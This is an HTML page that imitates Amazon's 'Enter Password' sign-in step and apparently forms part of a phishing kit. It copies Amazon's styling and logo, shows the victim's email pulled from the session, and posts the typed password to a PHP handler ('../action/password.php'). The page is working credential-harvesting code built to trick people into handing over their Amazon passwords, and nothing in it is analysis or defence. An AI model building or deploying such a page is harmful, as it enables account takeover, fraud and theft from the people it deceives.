<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon — Enter Password</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Amazon Ember', Arial, sans-serif; }
        body { background: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; }
        .logo { margin: 10px 0 25px; }
        .logo img { height: 40px; }
        .kotak { width: 100%; max-width: 340px; border: 1px solid #ddd; border-radius: 4px; padding: 20px; }
        h1 { font-size: 28px; margin-bottom: 10px; font-weight: 400; }
        .email-tampil { font-size: 14px; color: #555; margin-bottom: 20px; }
        label { font-size: 13px; font-weight: 700; }
        .baris { display: flex; justify-content: space-between; align-items: center; margin: 6px 0 15px; }
        .lupa { font-size: 14px; color: #0066c0; text-decoration: none; }
        input { width: 100%; padding: 7px; margin: 6px 0 15px; border: 1px solid #a6a6a6; border-radius: 3px; font-size: 15px; }
        input:focus { outline: none; border-color: #007185; box-shadow: 0 0 3px rgba(0,113,133,.5); }
        .tombol { width: 100%; padding: 10px; background: #FFD814; border: 1px solid #FCD200; border-radius: 8px; font-size: 15px; cursor: pointer; }
        .tombol:hover { background: #F7CA00; }
        .salah { color: #d00; font-size: 13px; margin-bottom: 12px; display: none; }
    </style>
</head>
<body>

<div class="logo">
    <a href="amazon.html"><img src="../assets/img/amazonlogo.png" alt="Amazon"></a>
</div>

<div class="kotak">
    <h1>Sign In</h1>
    <div class="email-tampil" id="tampilEmail"></div>

    <div class="salah" id="pesanSalah">Enter your password</div>

    <form action="../action/password.php" method="POST" id="formSandi">
        <div class="baris">
            <label for="password">Password</label>
            <a href="#" class="lupa">Forgot your password?</a>
        </div>
        <input type="password" id="password" name="password" required>

        <button type="submit" class="tombol">Sign In</button>
    </form>
</div>

<script>
// Ambil email dari sesi — tampilkan
fetch('../function.php?get=email')
    .then(r => r.text())
    .then(email => {
        if (email.trim() === '' || email.trim() === 'null') {
            window.location.href = 'amazon.html';
        } else {
            document.getElementById('tampilEmail').textContent = email;
        }
    });

if (location.search.includes('error=empty')) {
    document.getElementById('pesanSalah').style.display = 'block';
    document.getElementById('password').style.borderColor = '#d00';
}
</script>

</body>
</html>
